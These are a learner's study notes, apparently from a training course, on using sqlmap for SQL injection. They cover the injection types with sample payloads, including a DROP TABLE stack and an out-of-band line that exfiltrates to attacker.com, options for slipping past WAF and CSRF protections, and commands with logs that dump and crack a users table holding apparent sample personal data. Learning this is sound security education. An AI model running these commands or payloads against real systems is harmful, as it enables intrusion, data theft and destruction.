# Getting started:

## SQLMap Overview:

- sqlmap is a tool that detect and exploit SQLInjecitons
    
    ![[Untitled 3.png|Untitled 3.png]]
    
    ![[Untitled 1.png]]
    
- `sqlmap -hh` —>help menu

```
KareemAlsadeq@htb[/htb]$ sqlmap -hh...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "
BEUSTQ")
```

- ==**BEUSTQ**==
    
    - means:
    - **==B==** bolean based blind
    - **==E==** error -based
    - **==U==** union queries
    - **==T==** time based blind
    - ==**Q**== inline queries
    
    lets talk about each of them :
    
    **==B Boolean based blind SQL injection :==**
    
    - example :
        - `AND 1=1`
        - this always gives true .
    
    **==E Error based SQL injection :==**
    
    - example :
        - `And GTID_SUBSET(@@VERSION,0)`
        - If the `database management system` (`DBMS`)  
            errors are being returned as part of the server response for any  
            database-related problems, then there is a probability that they can be  
            used to carry the results for requested queries. In such cases.
    
    ## UNION query-based
    
    Example of `UNION query-based SQL Injection`:
    
    Code: sql
    
    ```
    UNION ALL SELECT 1,@@version,3
    ```
    
    With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`)  
    query with the injected statements' results. This way, if the original  
    query results are rendered as part of the response, the attacker can get  
    additional results from the injected statements within the page  
    response itself. This type of SQL injection is considered the fastest,  
    as, in the ideal scenario, the attacker would be able to pull the  
    content of the whole database table of interest with a single request.
    
    ---
    
    ## Stacked queries
    
    Example of `Stacked Queries`:
    
    Code: sql
    
    ```
    ; DROP TABLE users
    ```
    
    Stacking SQL queries, also known as the "piggy-backing," is the form  
    of injecting additional SQL statements after the vulnerable one. In case  
    that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL`  
    support it by default). SQLMap can use such vulnerabilities to run  
    non-query statements executed in advanced features (e.g., execution of  
    OS commands) and data retrieval similarly to time-based blind SQLi  
    types.
    
    ---
    
    ## Time-based blind SQL Injection
    
    Example of `Time-based blind SQL Injection`:
    
    Code: sql
    
    ```
    AND 1=IF(2>1,SLEEP(5),0)
    ```
    
    The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.
    
    - `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
    - `FALSE` response should result in a response time indistinguishable from regular response times
    
    `Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`),  
    executed as part of the auxiliary functionality without any effect to  
    the page rendering process, time-based SQLi is used out of the  
    necessity, as `Boolean-based blind SQL Injection` would not really work in this case.
    
    ---
    
    ## Inline queries
    
    Example of `Inline Queries`:
    
    Code: sql
    
    ```
    SELECT (SELECT @@version) from
    ```
    
    This type of injection embedded a query within the original query.  
    Such SQL injection is uncommon, as it needs the vulnerable web app to be  
    written in a certain way. Still, SQLMap supports this kind of SQLi as  
    well.
    
    ---
    
    ## Out-of-band SQL Injection
    
    Example of `Out-of-band SQL Injection`:
    
    Code: sql
    
    ```
    LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
    ```
    
    This is considered one of the most advanced types of SQLi, used in  
    cases where all other types are either unsupported by the vulnerable web  
    application or are too slow (e.g., time-based blind SQLi). SQLMap  
    supports out-of-band SQLi through "DNS exfiltration," where requested  
    queries are retrieved through DNS traffic.
    
    By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by
    
    By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.
    

## Getting Started with SQLMAP:

- to run sqlmap on `http://www.example.com/vuln.php?id=1`
- -u “`http://www.example.com/vuln.php?id=1`” the link
- - - batch this use the default for any user input that the tool asks for .

```
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

  

  

  

  

  

  

  

  

  

  

  

## SQLMAP Output Description:

- "target URL content is stable” —→ this means that there are no big changes between the responses .
- "GET ==parameter== 'id' appears to be ==dynamic==” —> a dynamic parameter means that any ==change in the parameter== will ==lead== into a ==change in the response==.
- "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')”
- • "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
- • "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
- • "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]" —→If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.
- "reflective value(s) found and filtering out"—→Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.
- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")” —→ This message indicates that the parameter appears to be injectable,  
    though there is still a chance for it to be a false-positive finding. In  
    the case of boolean-based blind and similar SQLi types (e.g.,  
    time-based blind), where there is a high chance of false-positives, at  
    the end of the run, SQLMap performs extensive testing consisting of  
    simple logic checks for removal of false-positive findings.
    
    Additionally, `with --string="luther"` indicates that SQLMap recognized and used the appearance of constant string value `luther` in the response for distinguishing `TRUE` from `FALSE`  
    responses. This is an important finding because in such cases, there is  
    no need for the usage of advanced internal mechanisms, such as  
    dynamicity/reflection removal or fuzzy comparison of responses, which  
    cannot be considered as false-positive.
    
- "time-based comparison requires a larger statistical model, please wait........... (done)”—> SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.
- • "automatically extending ranges for UNION query injection technique  
    tests as there is at least one other (potential) technique found"—→UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.
- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test” —>As a heuristic check for the UNION-query SQLi type, before the actual `UNION` payloads are sent, a technique known as `ORDER BY` is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required `UNION` columns by conducting the binary-search approach.
- • "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]" —→This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.
- • "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:" —>Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).
- • "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'" —→This indicates the local file system location used for storing all logs,  
    sessions, and output data for a specific target - in this case, `www.example.com`.  
    After such an initial run, where the injection point is successfully  
    detected, all details for future runs are stored inside the same  
    directory's session files. This means that SQLMap tries to reduce the  
    required target requests as much as possible, depending on the session  
    files' data.

---

  

# Building Attacks:

## Running SQLMAP on an HTTP request:

simple mistakes that prevent the sqlmap working :

1. forget to provide proper cookie values .
2. over-complicating setup with a lengthy command line.
3. improper declaration of formatted POST data .

### CURL COMANDS

- is one of the best and easist ways to setup an SQLMAP request against target
    - is by utilizing copy as curl feature from within the network monitor panel inside the broswer .
        
        - Firefox Developer Tools:
        
        ![[Untitled 2 2.png|Untitled 2 2.png]]
        

## GET /POST Requests:

### GET: `sqlmap -u 'http://www.example.com/script.php?uid=1&name=test'`

- we write its url using the -u flag and also we can use - - url flag .
- and we dont need to add data as in post because the data are already added in the url .

### POST: `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

- we just write the link in the command without any flag and then
- we add the data via a flag called - - data as the POST data are in the body not in the link .
- we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
    ```
    

## Full HTTP Request:

- we can use -r flag to specify a text file that contain lot of header in the request if we are sending a post request .
    
    ```
    sqlmap -r req.txt
    ```
    

## Custom SQLMAP Requests:

- If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMAP .
- for example, if there is a requirement to specify the ( session ) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option - - cookie would be used as follows:
    
    ```
    sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
    ```
    
    the same effect can be done with the usage of option -H / - - header :
    
    ```
    sqlmap ... -H'cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c' 
    ```
    
    ```
    sqlmap ... --header'cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
    ```
    
    we can apply the same to options like - - host , - -referer and -A/ - -user-agent , which are used to specify the same HTTP headers’values.
    
    Furthermore, there is a switch - - random -agent designed to randomly selct a user-agent header value from the included database of regular broser values this ins an important swiotch to remember , as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMAP’S User-agent value . - - mobile can be used to imitate the samrt phone by usign the same headers with this flag as if it is a switch .
    
      
    

## Handling SQLMAP Errors :

- to see the errors use `--parse-errors` to parse the DBMS errors if any .
    - the output will be like this `6:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064`
- The `-t` option stores the whole traffic content to an output file:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txtKareemAlsadeq@htb[/htb]$ cat /tmp/traffic.txtHTTP request [\#1]:GET /?id=1 HTTP/1.1
    Host: www.example.com
    Cache-control: no-cache
    Accept-encoding: gzip,deflate
    Accept: */*
    User-agent: sqlmap/1.4.9 (http://sqlmap.org)
    Connection: close
    
    HTTP response [\#1] (200 OK):Date: Thu, 24 Sep 2020 14:12:50 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Vary: Accept-Encoding
    Content-Encoding: gzip
    Content-Length: 914
    Connection: close
    Content-Type: text/html; charset=UTF-8
    URI: http://www.example.com:80/?id=1
    
    <!DOCTYPE html>
    <html lang="en">
    ...SNIP...
    ```
    
    - As we can see from the above output, the `/tmp/traffic.txt`  
        file now contains all sent and received HTTP requests. So, we can now  
        manually investigate these requests to see where the issue is occurring.
-   
    
    Another useful flag is the `-v` option, which raises the verbosity level of the console output:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch        ___
           __H__
     ___ ___[,]_____ ___ ___  {1.4.9}
    |_ -| . [(]     | .'| . |
    |___|_  [(]_|_|_|__,|  _|
          |_|V...       |_|   http://sqlmap.org
    
    
    [*] starting @ 16:17:40 /2020-09-24/
    
    [16:17:40] [DEBUG] cleaning up configuration parameters
    [16:17:40] [DEBUG] setting the HTTP timeout
    [16:17:40] [DEBUG] setting the HTTP User-Agent header
    [16:17:40] [DEBUG] creating HTTP requests opener object
    [16:17:40] [DEBUG] resolving hostname 'www.example.com'
    [16:17:40] [INFO] testing connection to the target URL
    [16:17:40] [TRAFFIC OUT] HTTP request [\#1]:GET /?id=1 HTTP/1.1
    Host: www.example.com
    Cache-control: no-cache
    Accept-encoding: gzip,deflate
    Accept: */*
    User-agent: sqlmap/1.4.9 (http://sqlmap.org)
    Connection: close
    
    [16:17:40] [DEBUG] declared web page charset 'utf-8'
    [16:17:40] [TRAFFIC IN] HTTP response [\#1] (200 OK):Date: Thu, 24 Sep 2020 14:17:40 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Vary: Accept-Encoding
    Content-Encoding: gzip
    Content-Length: 914
    Connection: close
    Content-Type: text/html; charset=UTF-8
    URI: http://www.example.com:80/?id=1
    
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="description" content="">
      <meta name="author" content="">
      <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
      <title>SQLMap Essentials - Case1</title>
    </head>
    
    <body>
    ...SNIP...
    ```
    
    As we can see, the `-v 6` option will directly print all  
    errors and full HTTP request to the terminal so that we can follow along  
    with everything SQLMap is doing in real-time.
    

Finally, we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests:

[![](https://academy.hackthebox.com/storage/modules/58/eIwJeV3.png)](https://academy.hackthebox.com/storage/modules/58/eIwJeV3.png)

## Attack Tuning

### Prefix/Suffix:

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.

For such runs, options `--prefix` and `--suffix` can be used as follows:

Code: bash

```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.

---

### Level/Risk

By default, SQLMap combines a predefined set of most common  
boundaries (i.e., prefix/suffix pairs), along with the vectors having a  
high chance of success in case of a vulnerable target. Nevertheless,  
there is a possibility for users to use bigger sets of boundaries and  
vectors, already incorporated into the SQLMap.

For such demands, the options `--level` and `--risk` should be used:

- The option `-level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their  
    expectancy of success (i.e., the lower the expectancy, the higher the  
    level).
- The option `-risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at  
    the target side (i.e., risk of database entry loss or  
    denial-of-service).
- The best way to check for differences between used boundaries and payloads for different values of `--level` and `--risk`, is the usage of `-v` option to set the verbosity level. In verbosity 3 or higher (e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed, as follows:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5...SNIP...
    [14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
    [14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
    ...SNIP...
    [14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
    [14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
    [14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
    ...SNIP...
    [14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
    [14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
    [14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
    ...SNIP...
    [14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
    [14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
    [14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
    ```
    
    On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3...SNIP...
    [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
    [14:20:36] [PAYLOAD] 1 AND 7496=4313
    [14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
    [14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
    [14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
    [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
    ```
    
    As for vectors, we can compare used payloads as follows:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u www.example.com/?id=1...SNIP...
    [14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
    [14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
    ...SNIP...
    ```
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3...SNIP...
    [14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
    [14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
    ...SNIP...
    [14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
    [14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
    [14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
    ...SNIP...
    [14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
    [14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
    [14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
    ...SNIP...
    [14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
    [14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
    [14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
    ...SNIP...
    ```
    
    As for the number of payloads, by default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.
    
    As SQLMap is already tuned to check for the most common boundaries  
    and vectors, regular users are advised not to touch these options  
    because it will make the whole detection process considerably slower.  
    Nevertheless, in special cases of SQLi vulnerabilities, where usage of `OR` payloads is a must (e.g., in case of `login` pages), we may have to raise the risk level ourselves.
    
    This is because `OR` payloads are inherently dangerous in a  
    default run, where underlying vulnerable SQL statements (although less  
    commonly) are actively modifying the database content (e.g. `DELETE` or `UPDATE`).
    
    ## Advanced Tuning
    
    To further fine-tune the detection mechanism, there is a hefty set of  
    switches and options. In regular cases, SQLMap will not require its  
    usage. Still, we need to be familiar with them so that we could use them  
    when needed.
    
    ### Status Codes
    
    For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between `TRUE` and `FALSE` responses could be used for detection purposes. If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).
    
    ### Titles
    
    If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.
    
    ### Strings
    
    In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).
    
    ### Text-only
    
    When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.
    
    ### Techniques
    
    In some special cases, we have to narrow down the used payloads only  
    to a certain type. For example, if the time-based blind payloads are  
    causing trouble in the form of response timeouts, or if we want to force  
    the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.
    
    For example, if we want to skip the time-based blind and stacking  
    SQLi payloads and only test for the boolean-based blind, error-based,  
    and UNION-query payloads, we can specify these techniques with `--technique=BEU`.
    
    ### UNION SQLi Tuning
    
    In some cases, `UNION` SQLi payloads require extra  
    user-provided information to work. If we can manually find the exact  
    number of columns of the vulnerable SQL query, we can provide this  
    number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL`  
    and random integer- are not compatible with values from results of the  
    vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).
    
    Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).
    
    Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.
    

---

  

# Database Enumeration:

## Database Enumeration(my summary) :

### Definition: extract and identify data

- enumeration of databases is searching and filtering the data inside them.

### keypoints:

- sqlmap data exfiltration
    - `- - banner` display the verison() for dbms
    - `--current-user` display the current_user() that we use in the db
    - `<users>` it displays the users names if we already hacked the target and it uses (inband —→ non-blind situations ) (blind —→ blind situations)
- basic db enumeration
    
    `--hostname`
    
    `--current-user`
    
    `--current-db`
    
    `--passwords`
    
      
    
- table enumeration
    
    `--tables`
    
    `-D` put the database name after it
    
    `-T` put the table name after it
    
    `--dump-format` to specify the output format make it to (ex: html ,sqlite )
    
- table/row enumeration
    
    `-c` specify the columns you want and put (,) between them
    
    `--start` to tell where to start from in the rows ex:2
    
    `--stop` where to stop at in the rows ex: 3
    
- conditional enumeration
    
    `--where="put the condition here"` to put a condition for the enumerated data
    
- full db enumeration
    
    `--dump-all` all the data from all dbs will be enumerated
    
    `--dump -D` all the data form the specified db will be enumerated
    
    `--exclude-sysdbs` it skip the enumeration ( extraction part= not displayed ) of the system dbs
    

  

  

  

  

  

## Advanced Database Enumeration:

### keypoints:

- DB schema Enumeration
    
    `--schema` gives a complete overview of the database architecture .
    
    - output
        
        ```
        KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema...SNIP...
        Database: master
        Table: log
        [3 columns]
        +--------+--------------+
        | Column | Type         |
        +--------+--------------+
        | date   | datetime     |
        | agent  | varchar(512) |
        | id     | int(11)      |
        +--------+--------------+
        
        Database: owasp10
        Table: accounts
        [4 columns]
        +-------------+---------+
        | Column      | Type    |
        +-------------+---------+
        | cid         | int(11) |
        | mysignature | text    |
        | password    | text    |
        | username    | text    |
        +-------------+---------+
        ...
        Database: testdb
        Table: data
        [2 columns]
        +---------+---------+
        | Column  | Type    |
        +---------+---------+
        | content | blob    |
        | id      | int(11) |
        +---------+---------+
        
        Database: testdb
        Table: users
        [3 columns]
        +---------+---------------+
        | Column  | Type          |
        +---------+---------------+
        | id      | int(11)       |
        | name    | varchar(500)  |
        | surname | varchar(1000) |
        +---------+---------------+
        ```
        
    
- Searching for data
    
    `--search` we put after it -T or D or C and the name we want to search about and it searches for it as LIKE”the searched name” so it gets all what is like the searched name.
    
- Password Enumeration and Cacking
    
    if we have a password table that are in hashed( normal case) and we used `-T` the sqlmap will automatically crack the password from hashed pass to a normal txt
    
    - output
        
        ```
        KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users...SNIP...
        [14:31:41] [INFO] fetching columns for table 'users' in database 'master'
        [14:31:41] [INFO] fetching entries for table 'users' in database 'master'
        [14:31:41] [INFO] recognized possible password hashes in column 'password'
        do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
        
        do you want to crack them via a dictionary-based attack? [Y/n/q] Y
        
        [14:31:41] [INFO] using hash method 'sha1_generic_passwd'
        what dictionary do you want to use?
        [1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
        [2] custom dictionary file
        [3] file with list of dictionary files
        > 1
        [14:31:41] [INFO] using default dictionary
        do you want to use common password suffixes? (slow!) [y/N] N
        
        [14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
        [14:31:41] [INFO] starting 8 processes
        [14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
        [14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
        ...SNIP...
        [14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
        Database: master
        Table: users
        [32 entries]
        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
        | id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
        | 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
        | 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |
        | 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
        | 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
        | 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
        | 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
        | 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
        | 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
        ```
        
- DB users password enumeration and cracking
    
    `--passwords` dumps all the passwords in a db tables and crack them into clear txt also .
    
      
    
- we can also do the process automatically but in long time
    
    Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
    

---

  

# Advanced SQLMAP Usage:

## Bypassing Web Application Protections

### definition :

the web application protections are protections made by blue team to prevent automated tools from working right .

### keypoints:

- Bypassing WA protections
    - this is the whole process we are doing here in the next toggles
- Anti-CSRF Token Bypass
    
    ### definetion:
    
    csrf → cross site request forgery (tazweer)
    
    ### command:
    
    `--csrf-token` make you specify the croos site request forgerry token after it by saying =”the token value” and by this we will bypass the Anti corss site request forgery token .
    
    ### output:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"        ___
           __H__
     ___ ___[,]_____ ___ ___  {1.4.9}
    |_ -| . [']     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   http://sqlmap.org
    
    [*] starting @ 22:18:01 /2020-09-18/
    
    POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
    ```
    
- Unique Value Bypass
    
    ### definetion:
    
    semilar to what happens in the csrf (cross site request forgery ) as it is just a unique value that whenever the user make a http request it should be passed in a randomized form 123 → 312 or what ever but they should be the same numbers in a random way to make sure that this http request is approved by a real user not a script or autmated tool .
    
    ### command
    
    `--randomize` we use it and path the value that should be randomized and passed on the http request .
    
      
    
    ### code and output
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&rp=99954
    URI: http://www.example.com:80/?id=1&rp=87216
    URI: http://www.example.com:80/?id=9030&rp=36456
    URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
    URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
    URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
    ```
    
      
    
- Calculated Parameter Bypass
    
    ### definition:
    
    the WA expects a ================================parameter value================================ that will be calculated based on another value of another parameter
    
    ### command:
    
    `--eval` after it commes a python code that says how the parameter 1 relates to the parameter 2 .
    
    ### example with output:
    
    ```
